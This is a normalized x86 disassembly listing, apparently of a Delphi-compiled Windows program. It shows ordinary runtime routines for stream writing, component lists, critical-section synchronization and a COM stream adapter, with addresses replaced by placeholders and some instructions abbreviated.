mov eax [ ebp - 0x4 ]
call sub_41b5e8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_412d14
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b6a4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412d40
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b788
cmp al 0x9
sete dl
mov eax ebx
call sub_412cb0
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41bcd8
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eca0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a904
push edx
push eax
mov eax ebx
call sub_412bdc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c0a1
lea eax [ ebp - 0x1c ]
call sub_40e98c
lea eax [ ebp - 0xc ]
call sub_40457c
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov eax ebx
call sub_413550
jmp r-xdata
sub_41c0a8
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41c0f4
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41c120
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41c290
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c0a8
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41c290
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c0a8
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41c290
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41c0a8
jmp r-xdata
pop edx
pop ebx
retn
sub_41c1a4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4042a8
je r-xdata
mov eax esi
call sub_40415c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40415c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41c290
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c0a8
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41c0a8
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41c290
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c0a8
mov dl 0x6
mov eax ebx
call sub_41c290
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c0a8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41c0a8
sub_41c23c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c281
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405bd0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41c1a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c288
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_41c318
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
call sub_41c2f0
mov eax ebx
call sub_41c2fc
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41c4a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c487
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c48e
mov eax [ ebp - 0xc ]
call sub_403164
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_416b18
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_416a08
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41c451
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41c422
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41c4b8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41c670
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c504
push ebx
push esi
push ecx
call sub_4034d8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41c758
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41c700
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_417090
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41c6c8
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4034c0
lea eax [ ebx + 0x14 ]
call sub_40cd4c
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_416b18
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41c588
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_416b74
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4169bc
mov edx ebx
mov eax esi
call sub_41c588
sub_41c61c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4169bc
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x10 ] eax
sub_41c648
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_416c5c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403164
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41c670
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403360
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41c61c
mov dl 0x1
mov eax ebx
call sub_41cb90
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41cb40
sub_41c6c8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41cb90
mov edx ebx
mov eax esi
call sub_41c648
pop edi
pop esi
pop ebx
retn
sub_41c700
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_416c00
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41c6c8
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41c648
sub_41c758
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_416b18
call sub_41c758
inc edi
dec esi
jne r-xdata
sub_41c794
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_416c5c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403164
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41c7b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41c794
mov edx ebx
mov eax esi
call sub_41c794
pop esi
pop ebx
retn
sub_41c7d4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41c7b8
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_416b18
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41c830
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41c5dc
push ebx
push sub_41c604
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41c5f0
push ebx
push sub_41c610
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41c928
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407cd4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41c9c0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
sub_41c9c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_416b18
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407cd4
test al al
jne r-xdata
sub_41ca10
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4042a8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407df0
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
xor edx edx
mov eax ebx
call sub_41cb90
mov edx esi
mov eax ebx
call sub_41ca9c
mov dl 0x1
mov eax ebx
call sub_41cb90
sub_41cab0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_416b18
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_416aa4
sub_41caec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_416b74
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_416a08
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_416b94
sub_41cb40
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41cadc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41cab0
mov cl 0x1
mov edx ebx
call sub_41cb40
inc edi
dec ebp
jne r-xdata
sub_41cb90
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404138
mov edx esp
mov eax esi
call sub_403420
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41cbd8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41cc00
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41cc48
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403218
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41cca8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41cccc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41cd14
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
mov edx esi
call sub_41cf44
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41cd7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41cf44
mov edx ebx
mov eax esi
call sub_41cf38
sub_41cdc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41c4b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ce04
push ebx
push esi
push edi
call sub_4034d8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41c504
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41c7b8
jmp r-xdata
mov eax esi
call sub_416c00
mov edx eax
mov eax edi
call sub_41cf44
lea eax [ edi + 0x50 ]
call sub_40cd4c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034c0
sub_41ce64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41c7d4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41ce90
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41ceac
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41cec8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_416b18
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41cf44
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_416a08
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_416b18
cmp ebp eax
jne r-xdata
sub_41cf84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41c7b8
mov edx ebx
call sub_41c588
sub_41cfb0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41cff8
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403164
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41d030
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41d07f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41d098
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41d0e7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41d100
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41d16a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41d184
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41d1cd
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_4187dc
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41d1e8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4057d0
xor eax eax
push ebp
push sub_41d3d5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41d3ae
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_402734
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41d39d
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402754
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
